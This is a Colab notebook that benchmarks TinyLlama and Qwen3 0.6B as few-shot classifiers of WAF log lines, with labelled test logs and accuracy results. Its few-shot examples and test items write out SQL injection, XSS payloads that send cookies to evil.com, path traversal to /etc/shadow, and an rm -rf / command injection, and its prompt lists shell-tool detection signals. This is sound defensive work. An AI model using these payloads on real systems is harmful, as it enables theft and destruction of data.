In [2]:

from google.colab import drive
drive.mount('/content/drive')

# !git clone https://github.com/acozzi/model_dialog.git /content/drive/MyDrive/repo

%cd /content/drive/MyDrive/repo
!git -C /content/drive/MyDrive/repo pull

Mounted at /content/drive
/content/drive/MyDrive/repo
Already up to date.


In [8]:
from google.colab import userdata
email = userdata.get('email')
name = userdata.get('name')
!git config --global user.email email
!git config --global user.name name

In [9]:
# Sincronizar desde aca


!git -C /content/drive/MyDrive/repo add .
!git -C /content/drive/MyDrive/repo commit -m "$(git diff --name-only --cached | head -n 1)"
!git -C /content/drive/MyDrive/repo push




[main 6bb81d4] waf_clasificador_tinyllama_qwen.ipynb
 1 file changed, 1 insertion(+), 1626 deletions(-)
 rewrite waf_clasificador_tinyllama_qwen.ipynb (91%)
fatal: could not read Username for 'https://github.com': No such device or address


In [10]:
!git -C /content/drive/MyDrive/repo show HEAD:waf_clasificador_tinyllama_qwen.ipynb | head -50

{"cells":[{"cell_type":"code","source":["\n","from google.colab import drive\n","drive.mount('/content/drive')\n","\n","# !git clone https://github.com/acozzi/model_dialog.git /content/drive/MyDrive/repo\n","\n","%cd /content/drive/MyDrive/repo\n","!git -C /content/drive/MyDrive/repo pull"],"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"id":"dXYogoe3eRbv","executionInfo":{"status":"ok","timestamp":1787838499485,"user_tz":180,"elapsed":23580,"user":{"displayName":"Alejandro Luis Cozzi","userId":"14119886823391185808"}},"outputId":"902a31cc-026a-4cff-9b7a-c726e9f487a8"},"id":"dXYogoe3eRbv","execution_count":2,"outputs":[{"output_type":"stream","name":"stdout","text":["Mounted at /content/drive\n","/content/drive/MyDrive/repo\n","Already up to date.\n"]}]},{"cell_type":"code","source":["from google.colab import userdata\n","\n","!git config --global user.email userdata.get('email')\n","!git config --global user.name userdata.get('name')"],"metadata":{"id":"NeSsmWeDgXgM","exec

<a href="https://colab.research.google.com/github/acozzi/model_dialog/blob/main/waf_clasificador_tinyllama_qwen.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# WAF Log Classifier with Local LLMs (TinyLlama 1.1B vs Qwen3 0.6B) — v3 (English, GPU)

**Changes from v2:**

1. **Everything in English** (system prompt, few-shot examples, code, comments) —
   prompts and few-shot examples in the model's dominant training language reduce
   the extra work of internally reconciling Spanish instructions with mostly-English
   log/attack-pattern vocabulary, which should also improve consistency.
2. **Two few-shot examples per attack category** instead of one. In the v2 results,
   both models collapsed onto a single "catch-all" attack type for anything unfamiliar
   (TinyLlama defaulted to `path_traversal`, Qwen3 to `command_injection`). More
   examples per category, showing *different surface patterns* of the same attack,
   should reduce that collapse.
3. **Explicit distinguishing signals in the system prompt** — one line per attack type
   telling the model exactly what to look for (SQL keywords vs shell metacharacters
   vs `../` sequences vs `<script>`/event handlers), since the previous prompt only
   named the categories without describing how to tell them apart.
4. Keeps the `reasoning`-before-`classification` field order, the deterministic
   post-processing guardrail, `think: False` for Qwen3, and GPU setup from v2.

**Models compared:** `tinyllama` (1.1B), `qwen3:0.6b`


## 1) Setup: install Ollama with GPU support

In [ ]:
# zstd is required by the Ollama installer to decompress the package.
# pciutils (lspci) is required so the installer can auto-detect the GPU —
# without it, Ollama installs fine but silently falls back to CPU even if a GPU is present.
!apt-get update -qq
!apt-get install -y -qq zstd pciutils


W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)
Selecting previously unselected package pci.ids.
(Reading database ... 118332 files and directories currently installed.)
Preparing to unpack .../pci.ids_0.0~2022.01.22-1ubuntu0.1_all.deb ...
Unpacking pci.ids (0.0~2022.01.22-1ubuntu0.1) ...
Selecting previously unselected package libpci3:amd64.
Preparing to unpack .../libpci3_1%3a3.7.0-6_amd64.deb ...
Unpacking libpci3:amd64 (1:3.7.0-6) ...
Selecting previously unselected package pciutils.
Preparing to unpack .../pciutils_1%3a3.7.0-6_amd64.deb ...
Unpacking pciutils (1:3.7.0-6) ...
Selecting previously unselected package zstd.
Preparing to unpack .../zstd_1.4.8+dfsg-3build1_amd64.deb ...
Unpacking zstd (1.4.8+dfsg-3build1) ...
Setting up pci.ids (0.0~2022.01.22-1ubuntu0.1) ...
Setting up libpci3:amd64 (1:3.7.0-6) ...
Setting up zstd (1.4.8+dfsg-3bui

In [ ]:
# Confirm Colab actually assigned a GPU to this runtime.
# If this prints nothing, go to Runtime > Change runtime type > GPU, then re-run from the cell above.
!nvidia-smi


/bin/bash: line 1: nvidia-smi: command not found


In [ ]:
!curl -fsSL https://ollama.com/install.sh -o install.sh
!bash install.sh
!which ollama


>>> Installing ollama to /usr/local
>>> Downloading ollama-linux-amd64.tar.zst
######################################################################## 100.0%
>>> Creating ollama user...
>>> Adding ollama user to video group...
>>> Adding current user to ollama group...
>>> Creating ollama systemd service...
>>> The Ollama API is now available at 127.0.0.1:11434.
>>> Install complete. Run "ollama" from the command line.
>>> The Ollama API is now available at 127.0.0.1:11434.
>>> Install complete. Run "ollama" from the command line.
/usr/local/bin/ollama


In [ ]:
import subprocess, time

# Start the Ollama server in the background
proc = subprocess.Popen(["ollama", "serve"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
time.sleep(5)

# Verify it's up
!curl -s http://localhost:11434/api/tags


{"models":[]}

## 2) Pull the two models to compare

In [ ]:
# Confirm the GPU is actually being used once a model runs
# (PROCESSOR column should show '100% GPU' or a GPU/CPU split, not '100% CPU')
!ollama ps


NAME    ID    SIZE    PROCESSOR    CONTEXT    UNTIL 


In [ ]:
!ollama pull tinyllama
!ollama pull qwen3:0.6b

## 3) (Optional) Install Python dependencies

In [ ]:
%pip install -q ollama pandas


## 4) Structured output schema (with `reasoning` first)

Field order matters for autoregressive generation: a short `reasoning` field
BEFORE `classification` forces the model to anchor its decision in something
concrete from the log, instead of generating `classification` and `attack_type`
almost independently.

In [ ]:
SCHEMA_RESPONSE = {
    "type": "object",
    "properties": {
        "reasoning": {
            "type": "string",
            "description": "One short sentence (max 15 words) explaining the pattern you see in the log."
        },
        "classification": {
            "type": "string",
            "enum": ["normal", "attack"]
        },
        "attack_type": {
            "type": ["string", "null"],
            "enum": ["sqli", "xss", "path_traversal", "command_injection", "other", None]
        },
        "confidence": {
            "type": "number",
            "minimum": 0.0,
            "maximum": 1.0
        }
    },
    "required": ["reasoning", "classification", "attack_type", "confidence"]
}

SYSTEM_PROMPT = (
    "You are a SOC security analyst specialized in WAF (Web Application Firewall) logs. "
    "You will be given ONE log line. Your task is to classify it.\n\n"
    "How to tell attack types apart (use these signals):\n"
    "- sqli: SQL keywords or syntax in a parameter value — OR, UNION, SELECT, DROP TABLE, "
    "quote characters ('), SQL comment markers (--).\n"
    "- xss: HTML/JS injected into a parameter or body — <script>, onerror=, onload=, "
    "javascript:, document.cookie, document.location.\n"
    "- path_traversal: directory-escape sequences — ../, ..%2f, ..\\, or an attempt to "
    "read a system file like /etc/passwd or win.ini.\n"
    "- command_injection: shell metacharacters chaining an OS command — ;, |, &&, backticks, "
    "followed by a shell command name like cat, whoami, rm, wget, curl.\n"
    "- other: clearly malicious but doesn't match any of the above.\n\n"
    "Rules:\n"
    "- reasoning: one short sentence justifying your decision (what you saw in the log).\n"
    "- classification: 'normal' for legitimate traffic, 'attack' if you detect a malicious pattern.\n"
    "- attack_type: if classification is 'attack', give the most likely type from the list above. "
    "If classification is 'normal', attack_type MUST be null. NEVER set an attack_type when "
    "classification is 'normal'.\n"
    "- confidence: a number between 0.0 and 1.0 reflecting how sure you are of your own classification.\n\n"
    "Look at the examples below before answering. Respond ONLY with the requested JSON, "
    "no extra text outside the JSON."
)


## 5) Few-shot: two resolved examples per category

Passed as prior conversation turns (not as text in the prompt), which is how
small models follow examples most reliably. Two examples per attack type show
different *surface patterns* of the same underlying attack, so the model has
something to generalize from instead of memorizing one fixed shape.

In [ ]:
import json as _json

FEW_SHOT = [
    (
        'GET /catalog?page=3&sort=price HTTP/1.1 200',
        {"reasoning": "Normal pagination parameters, no suspicious characters.",
         "classification": "normal", "attack_type": None, "confidence": 0.98}
    ),
    (
        'POST /api/cart HTTP/1.1 200 {"product_id":42,"quantity":2}',
        {"reasoning": "Valid, expected JSON payload to add a product to the cart.",
         "classification": "normal", "attack_type": None, "confidence": 0.99}
    ),

    (
        "GET /products?id=5 OR 1=1-- HTTP/1.1 403",
        {"reasoning": "SQL boolean-bypass syntax injected into the id parameter.",
         "classification": "attack", "attack_type": "sqli", "confidence": 0.97}
    ),
    (
        "POST /search HTTP/1.1 q=' UNION SELECT username,password FROM users-- HTTP/1.1 403",
        {"reasoning": "UNION-based SQL injection attempting to exfiltrate credentials.",
         "classification": "attack", "attack_type": "sqli", "confidence": 0.97}
    ),

    (
        'POST /comment HTTP/1.1 text=<script>document.location="//evil.com"</script>',
        {"reasoning": "Injected script tag redirects the victim, classic stored XSS.",
         "classification": "attack", "attack_type": "xss", "confidence": 0.97}
    ),
    (
        'GET /search?q=<img src=x onerror=fetch("//evil.com/steal?c="+document.cookie)> HTTP/1.1 403',
        {"reasoning": "Event handler onerror executes JS to exfiltrate the session cookie.",
         "classification": "attack", "attack_type": "xss", "confidence": 0.97}
    ),

    (
        'GET /view?doc=../../../etc/passwd HTTP/1.1 403',
        {"reasoning": "../ sequence escapes the allowed directory to read a system file.",
         "classification": "attack", "attack_type": "path_traversal", "confidence": 0.97}
    ),
    (
        'GET /download?file=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1 403',
        {"reasoning": "URL-encoded ../ sequence targets a Windows system file.",
         "classification": "attack", "attack_type": "path_traversal", "confidence": 0.96}
    ),

    (
        'GET /status?host=127.0.0.1;whoami HTTP/1.1 403',
        {"reasoning": "Semicolon chains an OS shell command (whoami) after the expected parameter.",
         "classification": "attack", "attack_type": "command_injection", "confidence": 0.96}
    ),
    (
        'POST /export HTTP/1.1 filename=report.pdf`rm -rf /`',
        {"reasoning": "Backticks execute a destructive shell command embedded in the filename.",
         "classification": "attack", "attack_type": "command_injection", "confidence": 0.97}
    ),
]


def build_few_shot_messages() -> list[dict]:
    messages = [{"role": "system", "content": SYSTEM_PROMPT}]
    for log, output in FEW_SHOT:
        messages.append({"role": "user", "content": log})
        messages.append({"role": "assistant", "content": _json.dumps(output, ensure_ascii=False)})
    return messages


## 6) Classification function (few-shot + `think=False` for Qwen3 + post-processing guardrail)

In [ ]:
import time
import ollama


def _fix_inconsistencies(parsed: dict) -> dict:
    """Deterministic guardrail: never blindly trust the raw LLM output.

    If the model says 'attack' but gave no attack_type -> label it 'other'.
    If the model says 'normal' but DID give an attack_type -> force classification='attack'
    (prefer a false positive over a false negative in a WAF).
    """
    classification = parsed.get("classification")
    attack_type = parsed.get("attack_type")

    if classification == "attack" and not attack_type:
        parsed["attack_type"] = "other"
        parsed["_fixed"] = "missing attack_type, set to 'other'"
    elif classification == "normal" and attack_type:
        parsed["classification"] = "attack"
        parsed["_fixed"] = f"inconsistency detected, classification forced to 'attack' (type={attack_type})"

    return parsed


def classify_log(log_line: str, model: str) -> dict:
    """Send one WAF log line to a local model (with few-shot) and return the
    parsed and corrected classification.
    """
    messages = build_few_shot_messages()
    messages.append({"role": "user", "content": log_line})

    kwargs = dict(
        model=model,
        messages=messages,
        format=SCHEMA_RESPONSE,
        options={"temperature": 0.0},
    )
    # Qwen3 has a hybrid "thinking" mode; disable it for this short classification task.
    if model.startswith("qwen3"):
        kwargs["think"] = False

    start = time.time()
    response = ollama.chat(**kwargs)
    elapsed = time.time() - start

    content = response["message"]["content"]
    try:
        parsed = json.loads(content)
    except json.JSONDecodeError:
        parsed = {"reasoning": None, "classification": None, "attack_type": None,
                  "confidence": None, "_raw_invalid": content}
    else:
        parsed = _fix_inconsistencies(parsed)

    parsed["_model"] = model
    parsed["_seconds"] = round(elapsed, 2)
    return parsed


## 7) Test dataset (with ground truth, to measure real accuracy)

In [ ]:
TEST_LOGS = [
    # (log, expected_classification, expected_attack_type)
    ('GET /products?category=electronics&page=2 HTTP/1.1 200', "normal", None),
    ('POST /api/login HTTP/1.1 200 {"username":"jdoe"}', "normal", None),
    ('GET /static/css/main.css HTTP/1.1 304', "normal", None),

    ("GET /products?id=1' OR '1'='1 HTTP/1.1 403", "attack", "sqli"),
    ("POST /login HTTP/1.1 username=admin'--&password=x 403", "attack", "sqli"),
    ("GET /search?q=1; DROP TABLE users;-- HTTP/1.1 403", "attack", "sqli"),

    ('GET /comments?text=<script>alert(document.cookie)</script> HTTP/1.1 403', "attack", "xss"),
    ('POST /profile HTTP/1.1 bio=<img src=x onerror=fetch("//evil.com/"+document.cookie)>', "attack", "xss"),

    ('GET /files?path=../../../../etc/passwd HTTP/1.1 403', "attack", "path_traversal"),
    ('GET /download?file=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1 403', "attack", "path_traversal"),

    ('GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1 403', "attack", "command_injection"),
    ('POST /export HTTP/1.1 filename=report.pdf`rm -rf /`', "attack", "command_injection"),
]


## 8) Run the comparison between both models

In [ ]:
import pandas as pd
import json
MODELS = ["tinyllama", "qwen3:0.6b"]

results = []
for log, expected_class, expected_type in TEST_LOGS:
    for model in MODELS:
        r = classify_log(log, model)
        results.append({
            "log": log,
            "model": r.get("_model"),
            "classification": r.get("classification"),
            "attack_type": r.get("attack_type"),
            "confidence": r.get("confidence"),
            "seconds": r.get("_seconds"),
            "fixed": r.get("_fixed"),
            "expected_class": expected_class,
            "expected_type": expected_type,
        })
        classification = r.get("classification")
        attack_type = r.get("attack_type")
        confidence = r.get("confidence")
        seconds = r.get("_seconds")
        ok = "OK " if classification == expected_class else "BAD"
        print(f"[{ok}] [{model:12s}] {log[:45]:45s} -> {classification}/{attack_type} conf={confidence} ({seconds}s)")

df = pd.DataFrame(results)


[OK ] [tinyllama   ] GET /products?category=electronics&page=2 HTT -> normal/None conf=0.99 (89.83s)
[OK ] [qwen3:0.6b  ] GET /products?category=electronics&page=2 HTT -> normal/None conf=0.99 (39.68s)
[BAD] [tinyllama   ] POST /api/login HTTP/1.1 200 {"username":"jdo -> attack/sqli conf=0.97 (11.13s)
[OK ] [qwen3:0.6b  ] POST /api/login HTTP/1.1 200 {"username":"jdo -> normal/None conf=0.99 (10.69s)
[BAD] [tinyllama   ] GET /static/css/main.css HTTP/1.1 304         -> attack/xss conf=0.97 (12.46s)
[OK ] [qwen3:0.6b  ] GET /static/css/main.css HTTP/1.1 304         -> normal/None conf=0.99 (12.34s)
[OK ] [tinyllama   ] GET /products?id=1' OR '1'='1 HTTP/1.1 403    -> attack/sqli conf=0.97 (12.18s)
[OK ] [qwen3:0.6b  ] GET /products?id=1' OR '1'='1 HTTP/1.1 403    -> attack/sqli conf=0.97 (10.87s)
[OK ] [tinyllama   ] POST /login HTTP/1.1 username=admin'--&passwo -> attack/xss conf=0.97 (12.15s)
[OK ] [qwen3:0.6b  ] POST /login HTTP/1.1 username=admin'--&passwo -> attack/command_injectio

## 9) Side-by-side comparison table

In [ ]:
pivot = df.pivot(index="log", columns="model",
                  values=["classification", "attack_type", "confidence", "seconds"])
pivot


classification            \
model                                                  qwen3:0.6b tinyllama   
log                                                                           
GET /comments?text=<script>alert(document.cooki...         attack    attack   
GET /download?file=..%2f..%2f..%2fwindows%2fwin...         attack    attack   
GET /files?path=../../../../etc/passwd HTTP/1.1...         attack    attack   
GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP...         attack    attack   
GET /products?category=electronics&page=2 HTTP/...         normal    normal   
GET /products?id=1' OR '1'='1 HTTP/1.1 403                 attack    attack   
GET /search?q=1; DROP TABLE users;-- HTTP/1.1 403          attack    attack   
GET /static/css/main.css HTTP/1.1 304                      normal    attack   
POST /api/login HTTP/1.1 200 {"username":"jdoe"}           normal    attack   
POST /export HTTP/1.1 filename=report.pdf`rm -r...         attack    attack   
POST /login HTTP/1.1 username=admin'--&password...         attack    attack   
POST /profile HTTP/1.1 bio=<img src=x onerror=f...         attack    attack   

                                                          attack_type  \
model                                                      qwen3:0.6b   
log                                                                     
GET /comments?text=<script>alert(document.cooki...                xss   
GET /download?file=..%2f..%2f..%2fwindows%2fwin...     path_traversal   
GET /files?path=../../../../etc/passwd HTTP/1.1...     path_traversal   
GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP...  command_injection   
GET /products?category=electronics&page=2 HTTP/...               None   
GET /products?id=1' OR '1'='1 HTTP/1.1 403                       sqli   
GET /search?q=1; DROP TABLE users;-- HTTP/1.1 403                sqli   
GET /static/css/main.css HTTP/1.1 304                            None   
POST /api/login HTTP/1.1 200 {"username":"jdoe"}                 None   
POST /export HTTP/1.1 filename=report.pdf`rm -r...  command_injection   
POST /login HTTP/1.1 username=admin'--&password...  command_injection   
POST /profile HTTP/1.1 bio=<img src=x onerror=f...                xss   

                                                                       \
model                                                       tinyllama   
log                                                                     
GET /comments?text=<script>alert(document.cooki...                xss   
GET /download?file=..%2f..%2f..%2fwindows%2fwin...     path_traversal   
GET /files?path=../../../../etc/passwd HTTP/1.1...     path_traversal   
GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP...     path_traversal   
GET /products?category=electronics&page=2 HTTP/...               None   
GET /products?id=1' OR '1'='1 HTTP/1.1 403                       sqli   
GET /search?q=1; DROP TABLE users;-- HTTP/1.1 403   command_injection   
GET /static/css/main.css HTTP/1.1 304                             xss   
POST /api/login HTTP/1.1 200 {"username":"jdoe"}                 sqli   
POST /export HTTP/1.1 filename=report.pdf`rm -r...  command_injection   
POST /login HTTP/1.1 username=admin'--&password...                xss   
POST /profile HTTP/1.1 bio=<img src=x onerror=f...                xss   

                                                   confidence            \
model                                              qwen3:0.6b tinyllama   
log                                                                       
GET /comments?text=<script>alert(document.cooki...       0.97      0.97   
GET /download?file=..%2f..%2f..%2fwindows%2fwin...       0.96      0.97   
GET /files?path=../../../../etc/passwd HTTP/1.1...       0.97      0.97   
GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP...       0.97      0.97   
GET /products?category=electronics&page=2 HTTP/...       0.99      0.99   
GET /products?id=1' OR '1'='1 HTTP/1.1 403               0.97      0.97  

## 10) Real accuracy per model (binary classification and attack type)

In [ ]:
df["correct_class"] = df["classification"] == df["expected_class"]
df["correct_type"] = df["attack_type"] == df["expected_type"]

summary = df.groupby("model").agg(
    accuracy_normal_vs_attack=("correct_class", "mean"),
    accuracy_attack_type=("correct_type", "mean"),
    avg_seconds=("seconds", "mean"),
    avg_confidence=("confidence", "mean"),
    fixes_applied=("fixed", lambda s: s.notna().sum()),
).round(3)
summary


,accuracy_normal_vs_attack,accuracy_attack_type,avg_seconds,avg_confidence,fixes_applied
model,,,,,
qwen3:0.6b,1.000,0.667,15.387,0.974,0
tinyllama,0.833,0.500,18.936,0.972,1


## 11) Try a single log line interactively

In [ ]:
def try_log(log_line: str):
    print(f"Log: {log_line}\n")
    for model in MODELS:
        r = classify_log(log_line, model)
        print(f"--- {model} ---")
        clean = {k: v for k, v in r.items() if not k.startswith("_")}
        print(json.dumps(clean, indent=2, ensure_ascii=False))
        seconds = r.get("_seconds")
        print(f"(time: {seconds}s)\n")


# Example:
try_log("GET /admin?user=1 UNION SELECT password FROM users-- HTTP/1.1 403")


Log: GET /admin?user=1 UNION SELECT password FROM users-- HTTP/1.1 403

--- tinyllama ---
{
  "reasoning": "SQL injection attack to execute a UNION SELECT statement with the username parameter.",
  "classification": "attack",
  "attack_type": "sqli",
  "confidence": 0.97
}
(time: 11.49s)

--- qwen3:0.6b ---
{
  "reasoning": "SQL boolean-bypass syntax injected into the user parameter, attempting to bypass authentication.",
  "classification": "attack",
  "attack_type": "sqli",
  "confidence": 0.97
}
(time: 11.16s)



In [ ]:
import platform
import subprocess

def _run(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15).stdout.strip()
    except Exception as e:
        return f"(error running '{cmd}': {e})"

print("=" * 60)
print("OLLAMA VERSION")
print("=" * 60)
print(_run("ollama --version"))
print("Python 'ollama' package:", _run("pip show ollama | grep -i ^Version"))

print("\n" + "=" * 60)
print("OPERATING SYSTEM")
print("=" * 60)
print("platform.platform():", platform.platform())
print(_run("cat /etc/os-release"))
print(_run("uname -a"))

print("\n" + "=" * 60)
print("CPU")
print("=" * 60)
print("logical cores (os.cpu_count):", __import__("os").cpu_count())
print(_run("lscpu | grep -E 'Model name|Architecture|CPU\\(s\\)|Thread|Socket'"))

print("\n" + "=" * 60)
print("RAM")
print("=" * 60)
print(_run("free -h"))

print("\n" + "=" * 60)
print("GPU")
print("=" * 60)
gpu_info = _run("nvidia-smi --query-gpu=name,memory.total,memory.used,driver_version,cuda_version --format=csv")
print(gpu_info if gpu_info else "No GPU detected (nvidia-smi not available or no GPU assigned)")

print("\n" + "=" * 60)
print("DISK SPACE")
print("=" * 60)
print(_run("df -h /"))

print("\n" + "=" * 60)
print("PYTHON")
print("=" * 60)
print("Python version:", platform.python_version())
print(_run("pip show langchain-ollama langgraph pandas 2>/dev/null | grep -E '^(Name|Version)'"))

print("\n" + "=" * 60)
print("OLLAMA MODELS INSTALLED")
print("=" * 60)
print(_run("ollama list"))

OLLAMA VERSION
ollama version is 0.32.9
Python 'ollama' package: Version: 0.6.2

OPERATING SYSTEM
platform.platform(): Linux-6.6.122+-x86_64-with-glibc2.35
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
Linux a754679d9574 6.6.122+ #1 SMP Thu Apr 30 18:17:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux

CPU
logical cores (os.cpu_count): 2
Architecture:                            x86_64
CPU(s):                                  2
On-line CPU(s) list:                     0,1
Model name:                              Intel(R) Xeon(R) CPU @ 2.20GHz
Thread(s) per core:                      2
Socket(s):                               1
NUMA node0 CPU(s):              

## Notes / next steps

- If `attack_type` accuracy is still uneven per category, look at the
  `accuracy_attack_type` breakdown by grouping `df` on `expected_type` too — it
  will show you exactly which category each model still confuses.
- The `fixes_applied` column tells you how many times the Python guardrail had
  to correct a raw inconsistency — a useful reliability metric to log in
  production, not just here.
- For production, worth comparing this against `Foundation-Sec-8B-Instruct` as
  well — slower, but trained specifically on a cybersecurity corpus, so likely
  much more consistent on attack-type distinctions.